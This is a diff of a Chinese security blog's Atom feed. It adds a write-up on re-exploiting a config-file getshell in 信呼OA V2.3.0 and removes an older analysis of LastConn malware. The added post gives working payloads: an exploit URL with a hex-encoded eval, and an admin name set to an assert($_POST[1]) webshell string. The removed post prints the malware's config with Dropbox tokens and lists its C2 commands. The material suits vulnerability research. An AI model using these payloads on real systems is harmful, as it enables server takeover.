@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-09-23T09:48:04.266Z</updated>
+  <updated>2021-10-18T14:09:14.142Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</title>
+    <link href="http://422926799.github.io/posts/3541f020.html"/>
+    <id>http://422926799.github.io/posts/3541f020.html</id>
+    <published>2021-10-18T13:56:13.000Z</published>
+    <updated>2021-10-18T14:09:14.142Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://www.freebuf.com/articles/web/286380.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/286380.html</a><br>最近打点的时候遇见个信呼OA，用的上述的<code>后台配置文件getshell</code>方法成过getshell<br>原本打算复现一下的，后面一看版本最新的。。。<br>(后面重新看了一下，发现修复不严谨。在后台用户重命名处修改即可重新利用)<br><img src="https://z3.ax1x.com/2021/10/18/5a8IFH.png" alt=""></p><h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>在V2.2.8的时候报出一处update拼接管理员名的注入+配置文件插入管理员修改config文件的信息<br>之前的payload利用：</p><pre><code>http://127.0.0.1/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=true&amp;style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2Fhttp://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961a:函数名称m:类名称d:处理文件文件夹父路径名称</code></pre><p>路由分析<br><img src="https://z3.ax1x.com/2021/10/18/5aGa9A.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aGrB8.png" alt=""></p><p>以前的漏洞点分析:<br>gerenClassAction函数更新管理员信息的点<br><img src="https://z3.ax1x.com/2021/10/18/5aGghj.png" alt=""></p><p>在V2.3.0后，int强转只取第一个参数的值<br>（一开始没看仔细还以为那里做了过滤，后面更了post也没发现那里不对。最好才看见这个int）<br><img src="https://z3.ax1x.com/2021/10/18/5aGHN4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ9ED.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJeDf.png" alt=""></p><p>但是saveCongAjax函数没任何变化<br><img src="https://z3.ax1x.com/2021/10/18/5aJlCj.png" alt=""></p><p>直接利用后台的用户改名功能重命名管理员的名称，在rockClass.php新建了函数过滤，eval被砍了。直接用assert代替即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJUVU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ0PJ.png" alt=""></p><h2 id="死灰复燃"><a href="#死灰复燃" class="headerlink" title="死灰复燃"></a>死灰复燃</h2><p>用户管理处修改当前登录管理的姓名为:<code>\rassert($_POST[1]);//</code><br><img src="https://z3.ax1x.com/2021/10/18/5aJIxI.png" alt=""></p><p>访问<a href="http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961</a> 即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJOIg.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aYiZT.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接：&lt;a href=&quot;https://www.freebuf.com/articles/web/286380.html&quot; target</summary>
+      
+    
+    
+    
+    
+    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
+    
+  </entry>
   
   <entry>
     <title>Exchange (CVE-2021-26855和CVE-2021-27065)复现</title>
@@ -446,28 +468,6 @@ map to guest = Bad </summary>
     
     
     <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>LastConn 样本简陋分析</title>
-    <link href="http://422926799.github.io/posts/519d2f5e.html"/>
-    <id>http://422926799.github.io/posts/519d2f5e.html</id>
-    <published>2021-06-19T17:35:48.000Z</published>
-    <updated>2021-06-19T17:55:09.539Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="事件来源"><a href="#事件来源" class="headerlink" title="事件来源"></a>事件来源</h2><p>事件来源：<a href="https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由.NET开发<br><img src="https://z3.ax1x.com/2021/06/20/Rimgyj.png" alt=""></p><p>使用混淆器混淆过，de4dot 也无法完全反混淆，但它能够清除一些混淆<br>完全混淆：<br><img src="https://z3.ax1x.com/2021/06/20/Rim2Os.png" alt=""></p><p>部分混淆清除后:<br><img src="https://z3.ax1x.com/2021/06/20/RimWmn.png" alt=""></p><p>入口点</p><pre><code class="c#">private static void LsfApkF4M(){            Application.EnableVisualStyles(); //启用视觉样式            if (Program.nigDBMdtyE5deZClpF != null)            {            }            Application.SetCompatibleTextRenderingDefault(false); //在应用程序范围内设置控件显示文本的默认方式(true使用GDI+方式显示文本|false使用GDI方式显示文本.)            if (Program.V9yJ8yp9ahRYqnZDsG())  //Program.nigDBMdtyE5deZClpF == null            {                w4X4wl9MxwlqqYZEne.cBFhC9cq2dv3Z();                if (Program.nigDBMdtyE5deZClpF == null)                {                    Application.Run(new Form1());                }            }}</code></pre><p>进入到cBFhC9cq2dv3Z函数（判断当前时间减去 2021/6/16/时间戳判断是否大于14天）<br><img src="https://z3.ax1x.com/2021/06/20/Rim5kV.png" alt=""></p><p>大于或等于14天，在 2021-06-16 之后 14 天不能运行，过了这一步检测。进入Form1函数<br><img src="https://z3.ax1x.com/2021/06/20/RimIYT.png" alt=""></p><p>获取主机名+当前用户名<br><img src="https://z3.ax1x.com/2021/06/20/RimofU.png" alt=""></p><p>用户路径的临时文件夹路径获取<br><img src="https://z3.ax1x.com/2021/06/20/Rim7pF.png" alt=""></p><p>检查是否有域的存在<br><img src="https://z3.ax1x.com/2021/06/20/RimHl4.png" alt=""></p><p>获取系统制造商名称<br><img src="https://z3.ax1x.com/2021/06/20/Rimb6J.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimqX9.png" alt=""></p><p>解密资源文件里无名的资源<br><img src="https://z3.ax1x.com/2021/06/20/RimOmR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimX01.png" alt=""></p><p>经过解密得到的为一份配置文件<br><img src="https://z3.ax1x.com/2021/06/20/RimztK.png" alt=""></p><pre><code>txt_Totime=60 //超时时间@txt_Ftime=50@txt_FristTimeConn=45@txt_PathDir=C:\Users\Public\Downloads //下载存放路径@txt_PassRar=1D1VQB4G8Q //压缩包解压密码@txt_Mutex=NVQAGGMV22CY37LNUO9T5CZVS@txt_KeyPath=SOFTWARE\Box@txt_LastConn=LastConn.txt@txt_ShellCode=ShellCode.txt@txt_ListFile=ListFile.txt@txt_isdownload=isdownload.txt@txt_FileToDown=FileToDown.txt@txt_TokenRunOne=O1P6jtSegunFJIAAAAAAAAAAS-BcSjDEdrK0SsV7BAHes97oBWke06Lhg8ThncuyCCy@txt_FileName=Viewfile //下载的压缩包名@txt_MyToken=O1PWT9LGL1As7EAAAAAAAAAAe6Oc-OILc7Y0SU9OIAFll1nElPBz_uE467zscqimYfd@txt_FileOpen=news.doc //诱饵文档@txt_Setting=Setting</code></pre><p>打开注册表路径HKEY_CURRENT_USER\SOFTWARE\Box，如果不存在则创建。然后从该路径读取名为OneFile的键值名称，如果不存在会退出进程，存在则进入到yExgOgDEb函数调用<br><img src="https://z3.ax1x.com/2021/06/20/Rin9pD.png" alt=""></p><p>先返回系统的语言<br><img src="https://z3.ax1x.com/2021/06/20/RinC1e.png" alt=""></p><p>返回系统版本信息<br><img src="https://z3.ax1x.com/2021/06/20/RinP6H.png" alt=""></p><p>返回一系列信息，然后上传到远端，利用Dropbox API 下载Viewfile.rar<br>利用rar命令行解压压缩包<br><img src="https://z3.ax1x.com/2021/06/20/RiniXd.png" alt=""></p><p>根据原文的报告，会从此处下载<br><img src="https://z3.ax1x.com/2021/06/20/RinA0I.png" alt=""></p><blockquote><p>第四个也是最后一个能力是命令处理。“txt_FileToDown”文件是使用“txt_Setting”文件中收到的身份验证令牌从 Dropbox 下载的。如果有任何命令要执行，该文件将包含换行符分隔的“<command>=<command arguments="">”条目。命令包括：<br>DFileDrop – 下载并执行托管在恶意软件 Dropbox 上的文件<br>DFromUrl – 下载并执行托管在 URL 上的文件<br>Cmd – 执行 cmd.exe 命令并通过“txt_ShellCode”文件将结果发送回恶意软件的 Dropbox<br>Powershell – 类似于“Cmd”，但适用于 Powershell<br>WMIC - 类似于“Cmd”，但用于 WMIC<br>ListFile – 获取指定的文件列表并将结果通过“txt_ListFile”文件发送回恶意软件的 Dropbox<br>UploadFiles – 在恶意软件的 Dropbox 上创建文件夹并将指定的文件上传到其中<br>屏幕截图 – 截取屏幕截图并上传到恶意软件的 Dropbox<br>GetIP – 通过 hxxps://api.ipify.org 获取 IP 地址并上传到恶意软件的 Dropbox<br>执行命令后，其条目将从“txt_FileToDown”文件中删除，并将该文件重新上传到恶意软件的 Dropbox。   </p></blockquote><p>该杨本所有混淆字符串解密：<a href="https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt" target="_blank" rel="noopener">https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt</a><br>沙盒链接：<a href="https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>混淆的cs，配合Dropbox做c2是个不错的选择</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;事件来源&quot;&gt;&lt;a href=&quot;#事件来源&quot; class=&quot;headerlink&quot; title=&quot;事件来源&quot;&gt;&lt;/a&gt;事件来源&lt;/h2&gt;&lt;p&gt;事件来源：&lt;a href=&quot;https://www.proofpoint.com/us/blog/threat-insigh</summary>
-      
-    
-    
-    
-    
-    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
     
   </entry>
   
